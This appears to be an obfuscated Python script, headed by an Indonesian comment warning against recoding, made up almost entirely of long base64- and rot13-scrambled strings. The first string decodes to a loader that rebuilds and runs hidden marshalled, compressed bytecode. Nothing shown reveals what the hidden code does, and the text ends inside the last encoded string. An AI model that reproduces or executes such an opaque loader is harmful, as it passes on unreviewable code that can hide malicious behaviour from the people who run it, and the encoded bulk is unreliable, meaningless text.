# Kalo Mau Recode Izin Dulu Bos!
import base64, codecs
magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpWZkF0NEhOZDEzc3pzZTdGWXZGOEVTQTVCRUFRb0F2dkFteEJFZ2dSZjRnT1VRRm5TV3U1NnNIY0FETEF2enN3U3dIb2h5NkdkdUhFWlNmVWpUaTNXZ091bVpkTis3ZGYyUzkyNGFiKzZkdDMwM2NiTlk5dW1pZFBVVnRvdlRiL0dyYjJ4cFo1ejc3eDJzU0JsV1c1YWdudm03SjA3ZCs3Y21mM1BmODQ5ZDM2WHEvbm5oczg1K1B6UFhoQ0VJM3lhUzNBeUwzTzdBaEgyK0hzOEQyVkxYT0NoNjAyc2ZsTTduK0s0MzYxdHBkRm9SZnVNWUxkQ3QzeUNwMXNoSWRDdEsrR2lXM2ZDVGJlZWhJZHV2UWt2M2ZvU1B0Z0thWDhta0FqdzJJWXJIY3cwSkJxbzdrNkhNcUZFQ0hSUG9wRjRFMkhpU3pRUmY2S1pCQkl0Skpob0pRMkpOaExhYlYvbDVQRG51TmQ1MHZnNmIyaGgwTnFvMW1ScHpaYldBbG9UMVZxdHNqYXJyTjFxcGNYYTIyR1Z0VmxsbmUrd1h0YzdyTmY5RHZ2WDh6cS94eWM2aXMxdzN6ckpJZEM3NUc3U1MvcnVDYnM5Y3RjNmxQRGM4MXgyd00zSnZkdi9nK2NTZlR4WDdKWVBZMHVrUlc0RXlmUTJxaCtSK3o3SFBRamNvMGU5Q1BjbDBmZit2cXlIYlRmNVRZNGNUUndoSWpuMlVTNXhsUFNUNDdBVnlRQTVBZHRqWkpDY2hHMC9HU0xEc0QxT1RwRW5ZRHRBVHBNUjJKNGdveVFDMjBFU0pUSFlucnpNa1RnWit5aEh4dTRKaVNFeVRpYWdkSmhNa2luWW5wS2ZJTk1id211OGVsWDJyWi9lSFNFemV6dzVRMHZPeXI3ZFVUS0wxeWFMOXpqMnBEcksrczB5L0F3L3lSN2dZYjdjZW50TmxTVnlLNWRMWDl5U1V3VTlwMEpwMDRWY05pdW5kQ1dYdmFpcXRNaWZUMHY2U2s3TkZIMjk3NC9OenNSTUpXNHFZNll5YmlvVHBqSnBLbE9aTWxjOElTYVRTY2RIRkUxVkJOVW9DQllIUy9EbEpmWkpsa1R4cFlnb2xtQjNTV1IvcklEV0U1T2dpaEhZQnp0ZWlvQmcvMWxkV29EMWtyUW8rUktjQzNYNkJWVDhIakVMZ2hYKy9SWCtlSVgvUU9IOU1FYmZmT1ZUUDZiL3dUSi9xdGdpemhmMHRad3FuaEdmelJYWHBJMWdzVnU4SktYazVWeHVBd3JQcWJSMGRHdTdHQ3dlRWE5bU5WMWFWYVdNdlN1WlcxbFJVb3FVRGhZU1A5YitGamZYZEQydm5ZbEVwTHd5bWxkelc5dGFTcFh5OG1ncWw0bmNqVWZPcXZLZGdxenBjMFRSNEdIWnhpcUtyQTNDVnMrbGN1azVMWmZhME1ZSGRTVWo1d3I2WEN5Sy93WlR1VUpXVjdmbnBIUjZVTlBTZEN0bGM5bnRqS0xUMGtyemdxUkxrVnVzdVZGOVN5L3pteFgrV0lVWHBVNmU0MjdraWtvNkxVVW1ScVBpMEhVbFc5aWFGZWV6Uk0wcFJJekZaOFZieXBhY0ZpY2s4WHhCU1pQSTBxM1kvR2c4Rm90RjRZRG8yS3k0ZVhkWW5NL24wL0x6OHZJMVJZOU1qRTJOamsyS1E5ZXUzTDV4L2JTWVZqWms4YktjMnNnTmkrK1RWUTErRTVGeE9OV0ZOVFdYa1NNems2UFIwZkhKeWZIUm1iaDRJN2VzcEdWeFNWcVJWTVZzeUw1cDhSaFdqbzdHbzZPeHNTbXJrME5qc1FoMmREd2VKWGxsVm94RnA2TmJjZmczSzE3TzVWYlRjbVNWYnV4TG1SV1hKWFZaMXUydG5FMCt0elFyam8xTlQ4WEh4cWZqdzZsYXk5WUdud3RvbDM0THhxejRLenEzeXhNZXNVRVhkQmZnbktDN1FicDBEMGczMVQxVTl4cmxYcEErb3h4MS80Tld4RVRkUjcreDR3SlVaOGNGYWQyR0I4RjcvQTVYUW9zVitwalF3NUhHdTV6NlFUaW4zem9xVEhWMlZOTURQMjAxc0Jza0lkbzc3R2N6MVJvUXc1NkhsZ0RGV3ZSUWlidkhRMXQvUjIvY0RaTlc5bjFQMkcwaWJYdjhEcTgzazNiU0FaamZVbUpYMmJyZVJqcExQSnlqNjRGTGI0Y2VkYjhoa0o3N3dtN0hIa2NPOVhBN0FoelRheHpER1NOalgxdWY0OW9PczJzckNlUklEMWlaUFE0c1JJUFY3NlAwMkM2N3Qzb0RQY3BGcnpOTWRRL1ZSWGExckphYjA3dTMvNERuZGx4Z2ozb09QS2FoNUtxeVIxRC9aUmNkRTZxaFJSbytkclBzU2FWbFNhMEl3YURxaGJ1dStsRDRRUlEvSVM0cGFXbHRROHFLTnlTdGdOc0xnRGFLTE01dkZMS094eFdlVCttMGVFdlNkQVVyWFM1a0pkelNXcmNMbVdVcExUNlgxUXNiNHZYY3FwSTlMVDROMWVoQjRuazVYY2lJTitUc3FxeExhd1hGT0lIbWFQeWFESzJLWmRkbEdYN09BTHBuaXdHekcyZFU1RkJ2dWtBOGRKVmQwSWJhREhyQ2RmbmliVFdFbDlEUFRqT1AzVmxRSkpWZHpUVlpmQkdBcGJBc2o0Nk9Gazlza2RXUlhGN09paVp1YmVQTzBXVTVVb2hOSlo1WlhkTEdwQmVMRFVSTEZqUlpUU3BrcnRqaStESTBldXJzOE95YjhHUGhLazBVZ1o2RFBRcEJBRklic1BTRTJiQXlxcGpYUmNFUUFESnlOeGJCbHJSSXhSdFJzaXU1eUVPaEVzU1NFV2xWenVwbGI0cGU3RU8rN0ZzREF3dzF5MjdjYlp5TERRVTlWd0N2T0NnK0w2ZWhiUmlkY21DbGtFNG5zMUpHZmxQQWZYMzJQVEpHY0tsQXBEVzRDMWxKSGU0cEN6bXQ3TlcyTlYzT2xEMTVWY0d6TDB0ZzROVXlmNjNNM3lyelY4b2VKWnN2d0oyNFVYWWpQcGM5V2xxVzgyVzN2S1hvWlplbXEyVkJsYUVWZUtaU2EyWFBxcG9yd0Y0YzNySm5VMVYwdWV3MzRGOVRPNkJUNVFCZURMdFU5N3FXZzJxNm9xZWhpWlZjT3AzYkxBY3VicVhrUERLTVlYZWlaVEVhaGYvUnhjVkYrS0NPUlZTblJYUXZGT0UrL0xkSXE3SmFWR05WVVR6azFGazh2MEJXeTU0MFBwakk1clVqSUFRK3lEL0ZEL0xOL0RrK0JOdHgvZ28vS0lUNU9POS9SWGhibllNcVZhanBjYUptQ0I3SDEvaml3cDhvYnQ1NUxHNGV0TCs1THE2MjFPS3FIdHB0M09OZS9kb09YK0wwOEQyT3RMNGg3QWdsZmgxUUZkQ3VIZEN5ZVE5d2huVG9MU1VYNmV4aEdQd0xjTjc2YU5YbE9HKzNkZDRlKzd4Wm5SeWliZlVhYlgzOXdMYjZqTGJZY1JLZ01CNTNoQjJuL1FZNTZ2d09uRmlvd20vUk1jYkhEUHgya1g3QTcxWUhmcmVSNDJRQUxFQzdZUUhzOGVxZ1o0MGMyRHRveldncFlHSzZHLzd1dWN5eGZYY2xNYmdTN2FsTmFCSC9YdVFjMXFMek5YNzdnNno4UUd0eGdvM1ppK1l4WFhETXg4REd1QjlqWTl3MU5zYjlzdHV3TWFCUkd6TjRVdzJqVFdsQ1VXTmlYbVA0ZkVWU0N4cVlnWXhoWnViendLVzJ4WGxkS29qWEZVM09hc3BwOFpxVWhxL0dMZ1pjMXlRaXBRdVNxa25PZHA3TEE4QVNHV0grbGlwbmxFTG1rU2JIYUpIWkdXcEExQllVcmRqQmdMbWIyUm9WZitacU93cHFYeVlBYlpjMVFEWHgvUmJHV3dqUGVQY1dHYzFzanlva29zcXJDa0NyR3ZuQXdXYnB2SnJiQkRoRXMvVFNQck5FVk9XdVBNb29IalVmSzhBaEl5UVNHNC9OejV4UExpL0lGeTlQUG52dHlzelZwVHZ4cThYbjB4TmIwdldwNU5OZ1l4UjU4MnhCeTgvUkpqU3k4VkFvdStDcUVpNGkzNjJjZW16WFUydEFhMGZ6YTNtd1F0NDg5RGVqVlpvMWVnczJyRnVBd0M0UlhkN1NLNzNtcU4yVzAxVzNDUzVNN1VlVHVMN3Y2amFsVVdESmsvSHBzZW54cVpsNGJIdzZlaFlibXpzdlpWZFB4S053M3hUWUdJOERhQmRVS2JVQlc0c3FnUDRpcTdzazZRWFkzRkN5cTZ1RlNsOGVIcXdOU1lFaGhzdFZVckxJdXI0bUxTdGF1UkdPMWd0YWt1MnFuR0szNXJaQ3BBM3h2QUpQRmo0cXF3YWxXU2hJNGdLdENGZFM5dVhaN'
love = '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'
god = 'NLbHpCRmhScWoyNWpPa3NsTFdmRk14U3V5NW56WFpKelpWNFlQcVIvR0p0SVVzSm5MaTlQSXVxcGtWOHROa3BaU2xDVDQyN0tha2pURVVIQ09jV2JaQmNJQTVOc005M2NzUUgrQzloNXFyc3JNZXRpR1k3TGFldEFvOXJnRitDZE5TR1JSYTUrSno0WVhiWG0rcHYrOGFJYW9yYmxoQTg0VHJjbEY1d1N5NmZyYXpyRVZ5YllhWTRjN2tKMjF2cmhZaTlrZkFZRVhxOTJrbU4wUHpyR2ZIK1RkUWdpMms0RFFjY1R1dDl3dWdYZS9YZlVSM0cvdC8vamZPaVZZMGU2UFBCSWZUeUUrL2dGR3UzV01XZ3U2UUtmMVVIZFQzVU9ucXIySWZZQ1NOQUpPZkJ1Q09xcDc2SDQyVWVxbnVwdnFBU2Y2NmI1MVB3bmlMNTVGeFBVQXhzUUJoNEo3bk1LVHB2c0NPTE1OdXlFZ25ZQ1I2MkVqRWFjRkkrcTB2SFZmdVV0dlBxQ3ZiYXl2Tk0yRk9uM2cyTFdBNjk4T1dOOEJLTytHSXdWNk5ReExzVytkaUwwMHNhZlYyVGNyeGFlTnBmZ0FsZzRBbGdZd0prK3h0STlPOVhySVlZcVJSMEE3U2pYZXdORG0vZnNNN1B5azNreW9HMkZjZ1VoMWRnWEhIT1V1UjNrL3hjYmo5TndNT1RsSHpRRzdwb0djWFZYSTJRM0kyVzRoNTBIM3pmc09rUFBFemJyNDZHUHMxSmdTNVMxMERJdFB3MDhXWnpKekdsQkI5VVVzNUNNMDRHa0RGR2F5c0p3V3JkTDBvWDZGOUovcHB4TUgvYWY3S1l4V3V2cUJjRW45Wno3VVQxTkJ6UDBpblBpbVJETmIrS1I2SDJzKzhaak1HbWNFc05ocFJQNEFseEJ2R1hBQ283TDltTmRSL0ZrVW4wVHhLUlNmUm1HQnBQb1pQRzA3dzBZYkZoY1VHSTNQNHY2ZlE5enBZZE54bitmTTZCNysyc3N1Z0hZYjMrcVM0WnB3WW80ellvb1VCWkYvNXROU1NyWTU4Nk9oYjlFQ1A0WkhSampQRENsR3phazRtNjh1V2hrMVVUUHFaMFFlalZwbUpOREJWazJjY3lUWldOSElXdVQ3Q1JDdklSQTlUWkZ2aUtiWERBamRmRGQvQlJEc0ZOL0h1L2wzZ1hvL1VZdDYrSngybTZoM21xWGtaTjhGN2tYKy84ZTlBRmY4RzdSL1hSVDd1dmRoWHc5ZzN5RUQrM29wOWkxVDdPc3pzTyt3Z1gyTU5SNEZUZHlIZlRYN0dQWVpaL1ZnY080ZG5ubGd4N3Z2ekY2cmRlKytNKy9iWjZEdXI5NzVUQTN1OWp2dzlmZ0J1RHRBY2ZmRUFiZzdlQkR1WnM4aDZ1bzlORUNZTlFLRS81Zk96b0xGZDE2R0hoeUNzMzhhY04vM0dOejMxZUMrNzJXZmdmdWdVZHcvV1JmMzFUM09qS0pZbUs5K0FRVUN2Zm9YVUZSRHZmcEZGRC9QR2Z4WS9Vc28vaktLaHlnUXdtK3Jmd1draGMyWUNQa3VzRGtoNURkc2ZGWi9BWVVOeDczMTRGajlxNXlUYnY3d2NLeitOWTdqSGczRjVaWnI4dlp5VGxMSlZXRDNxbHJJNnpTd3dTRGFiOFVGYkVwcFRLL1k2R3ZPM3BpRTBrSmFLeDJESWJLanlFUmtBNkxONXV3WWc1V0xZWkpmRTY2TnJ0U2k5ajBRZUorMWozT1lpVkdOMmdMOElYSWZBdWFLK1AzRDhOWWhvZldId1BzaFFmaUI4SjNtSmdQejc5VmlmaFhUZlJLWjd2LytmeVlTOEtFZk5oS0FxZW9FckFHZ2VWTlZSS0I1dllXMDBZaEFPOFhUTnN3eXVjZWlBRjJBcDkxR29ucFBEMld5MUpkdll0NDlNbFRveXppZ2V4dndWQllsT0FySGRqTGNScHpHUkVmS1BlMlNnYXBvUWRQajZ4b1kvSWs3Ri9VbUdOc3VhMnhQVUoxZDY2Q2ozTzhvUDZsM2d4eXFpaHJZTllmdG1nWUs5bFJ4WDhUQXcrOUoxT0FVaXhxb2Z4ckZUNlA0aElsWmRjSHhaeXh3Zk5VQ3g5Y3NyS1RoZ1lBUjV3V3VpTTlxOGVUQlFRSjVLNS9PcVhJRWlyUkl4UmM1bTB4S2M3RjZYcjY2amtEajBuUDVoRjlqUzdHMFJEZ3RZUko3MHNnN1NIZ3pNbEVremNiUGhJZVdzTWo5UVR4WC9kbGFITFU4ZmZYUG9mZ2NpamRRUEVEeDUxSFVnMW9iWlhjdDRQelIvWHJuVExXSmRsRm5wcGtWbmJXbXZabGZiNmVkT2FEVERyMGFoTmNSSUxCanNWR3pKcGJYNHVSSFFmd3lkNEJmL3hSL2lUOERKZS9Tci85b0xkcDVuV2ozUjVqRjlvMTN5bTlMOEp1NHk2bGZBWDVSdjdiZnFJMDQ1QVptR1FBY1F2UUxkaUYrZWFxOGFpOGlIR2tBcm53YmZxbU1jeUNpaFF6T2dYcGpGVmNPQVA5RFRJd0R4dzFTOXR0RW12Y0VHdjFzSkMySWlZQkxyWUJMWWN5dFE2eWp6THFOWnRwNUtmYnhEL3dValR3SDFXRG9jT2NGM1VQb3BLQnhsZTFVWjFmWjRTaDNPY283OVdhUWxDMWJQTXl1MlczWE5CQ294WkVXZjlBSTlOUXM0R25kL2g2Z2xJZWkxRUhIZUV1ZUdwVHl2T3d4VUFvMGlsS0g2akkxUUpxRlhFWlNzb2FQUHV3cUJzK3Q0bHdHZ2d2bzI5SmFMa2YxMExtMW5HN3RvUTYyQkVkNUxLeXJwbnJLdDEwR21pbmZjbFVSc2s4L0NqcUtvMWFIUkxzanAwVzdJNkE3T2pMY1ZoZEhiT0NvSVc4VVZpSVdPRDJ3d09SQUNQR2FxMFFjeE1yMGFhTVdaWEp5S0lPbVJhdENnN1puYlVjTGpXb3RWdXNINGNYSFFQeHJ6dUVOKy9rRnlxMUNBczdLOVA5UXZyQmpnY3JIYXJFQy8rRUtvSE40TXB5VGt6bGNZcDRRTU92MW8xekNoVWswc0hVVEQvSEMxa044UzhCUDFaL0VobmhISTNoL1cwM1FHWEp6OEVNc2NVbHVGWDUrU1o1S29GcEUySFd2d2svcWRSNVhDcnpPRXpkb1hxcDVyREt2VmVhcnF1ZWptcitxSGl1cjExN2dzZTM1clh3QXU1N2ZuUEUzNXZRRGVBYkRQUXBSM1V2MVJyYmVnVTdNSVB3MTBmeVYyZUxBZ1VjMDIwZkFXQUM0bGJqMUlHa0JLQXZ0Y2JoaUJrcXhyR0ZIQUxleDNYQVZ3L1JZTndXV1Z1YWtVZDNLQnlyZTBURWh1ZGs2Wnp2VjJUazdEaWp2Zk5EQzRBbVRqKy96cjQ0QkJZVXpBL0NlM0hHWDNMdXR1THJtSldISHMrTXRlZUZiR0NneDN3Tk9ZQW0vdDVFd0VmYUVrbzhjNnVKQTluWnhxKzRkZjhtRksxN1dPMHBDeVZQeTc3a0JZc3QxTW1nYW5SazBlaGo2Ym85WG56MWVUbEEweDhKWVpXTFc5VmZYWmVuSGNDOE8wNXdHNFUvZ1hxanZ3YjBZdCs3RjBJOThMenJ0ZS9FYWYyZTN6dDM0eG8vM2JodzRaa2NjMlNSSGJ6SkxRZzJMYmJMeWxzazZKTjZncyt6aVBqSXNGdjFURXlmRVM4Q2RhY0pDMFQ4ZFBTRXVwWE9iUlU5UUZJMGNCM1dMTXduNE5sWUtPZWF2empET2JPU2VzTml0dWRhaWdIa0UzM3psQzhVaGxrQWhMbTdVQkhiRlo5bTBmMlJ4QTZjTWc4V29VZk5DL3FDYUYvSzBwbWo4ZXhPVElZYjVSRU5HMmtwdTV0UU5PSW9heklRckZoOUxlR2lHZHNKblRMK3BSZXhzQ1EvcEt2dlN1VndlWjlMY2FlV3VYSFlSeFpnUys3QmxGZTFGSU5URzBUazFONjROc3ZsME9hamwwNHFlVnJLeTVqQ2JyNkJBdzFEMjBQM1V3Q2E4V21FNW8ralFob1RacWhvTU5NMUhOVzJsT2J2bFlNVE9RTEdWNmhDMWViUEoxZTBsSWRGRkJ3V3ZtVWhqbE50YWNiSm9zbkE3TkcwM1pxNy90QUloKzZiYnl2NWtVc2txZWpMNW45RnFmUU81TTQ5L0lYNWZ4c1BqTWlDcVB1RzNCdDFCSHUxMkp4OEVLVHpXWGdmZkNya3hDVGJNOS9IdHZQRDlJMjhQZWpFeDl0MjIwV20xTWNBWG0xaVd5cWg1dFNtM3czRGo3OEphb3ZyVHNPYzFvVGhaY2kwQVBIemdqeWdFY1hzWU9lWjNCZGg2U3A1ZEZ5YmNycnQzUFh2QVRRR0thS0l0cm9IUi9jZ1M3dEdVVTR6aTd2R2RuTUxUTlN2QTVSVU8xOFY4a3NlVk1TQWJTQWhrSXdtREJKWVBzb1cwZ213ajdTQTdqUFk2cTl1RFBWMGxMOGh1MGdQeUVPa0YyVWNPZ3p4Q2pvSVV5VEdRL2VRNHlBRnk0cE0wTlpnTVFtdU41Q1FaMmtNT1BVeTlBSGRKd0ZlcGtOUFFyNUUzdkFDYW52VXdHUzM1QVVZakpIcmZ2Uk1nTWIycEZGaHZOdEpUSjR2SGRINGRycDVHeStNUDZCSldoU2RqOXdWY3Rrbkdlemd5QWVNUkxBWEpKT2hUb0RlQVBtM29JVEFtclpqdXE3ZXZDTnUveklDVXpPdzB3Q2YwSXBkMW0xQ3NkNUF6Tk9JN1MyTWFUMUo5anVwUE1kYXZkemoybjNYc1AwZDlrMGZYbWJlVFNBK3NjNzdVOE5nNkYwb1lNVmxnNmRCZ2JycDNlK2pJWEtUdHU2Z1g1aWVYeUdXNGc0ZnNQWEFFalJlQkVmb3F1Vkkxd3Q5K0QwYTR'
destiny = '6HacbZF9dqQAUHRq1GzH2paS0IIb5MwS0FSuxqyx3pwqdZJqdG3MLpIV3nvghI3S4A2teozEirQqkpmq4qTAyGJAuqQIZpUcdGSu2n2u0IyxiAwyCXmD3A2uZHJq2JRD1G1yIG0SDFapipIV5LH83nQWPBSWYqSOcZIWhMzWkoR4eoxtjGTHinUb3ZH05D3W3A0V5EaAkM2L3HaAcMKWxIxjiBJ9UI1OjrGZlAmASpxS2IQZeGmEOMIp2qzufD1I1GwOHFzWdqxcxMJI5ZKOZBKV2LzEOF2uVGRAKp3OHMRqPoKWBGRSLq1c5FyWSAJ9upRS6HJj5oQx1I2AjoTEuBKMSEJEFJQZ4oRLkETRkJJSVFwMzD0yKFyWApyx2oRb5JH40BIO0HF9Qn1I6AxMEIHu3DH9IEzquZSEGoUAgFISbGTHlGKbjZyOEIIpkA1EupwACM2V2M2qQJH1lMHSPESuGpTcnISN0rHuBp1ubp2SgJGMBnzfeHTbjZH14oJMJnIMmX1SIIH1ipIuIDxSIX0gMM0